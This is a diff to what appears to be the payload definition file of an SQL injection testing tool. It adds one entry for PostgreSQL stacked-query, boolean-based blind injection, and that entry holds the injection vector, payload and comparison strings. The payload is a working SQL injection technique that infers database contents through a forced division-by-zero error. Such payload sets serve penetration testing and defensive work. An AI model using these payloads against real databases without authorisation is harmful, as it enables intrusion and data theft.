@@ -526,6 +526,27 @@ Tag: <test>
     </test>
 
     <test>
+        <title>PostgreSQL &gt; 8.1 stacked queries (comment) - boolean-based blind</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</vector>
+        <request>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE (1/(char_length(substring(version(),1,1))-1)) END) IS NULL</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
         <stype>1</stype>
         <level>2</level>
